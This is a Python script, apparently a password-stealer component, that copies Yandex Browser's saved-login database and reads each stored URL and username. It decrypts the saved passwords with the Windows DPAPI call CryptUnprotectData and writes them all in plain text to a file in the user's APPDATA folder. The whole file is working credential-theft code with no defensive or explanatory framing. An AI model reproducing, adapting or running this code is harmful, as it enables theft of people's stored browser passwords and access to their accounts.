#coding=utf-8
import os
from Crypto.Hash import SHA512
import sqlite3
import win32crypt
import shutil


def Yandexpass():
	textyp = 'Passwords Yandex:' + '\n'
	textyp += 'URL | LOGIN | PASSWORD' + '\n'
	sp=r'C:\UserData\AppData\Local\YandexBrowser\Application\User Data\Default\Ya Login Data'
	if os.path.exists(sp):
		shutil.copy2(sp,sp+'2.db')
		conn = sqlite3.connect(sp+'2.db')
		cursor = conn.cursor()
		cursor.execute('SELECT action_url, username_value, password_value FROM logins')
		for result in cursor.fetchall():
			password = win32crypt.CryptUnprotectData(result[2])[1].decode()
			login = result[1]
			url = result[0]
			if password != '':
				textyp += url + ' | ' + login + ' | ' + password + '\n'
	return textyp

if __name__=='__main__':
	f=os.getenv("APPDATA") + '\\yandex_passwords.txt'
	print(f)
	file = open(f, "w+")
	file.write(str(Yandexpass()) + '\n')
	file.close()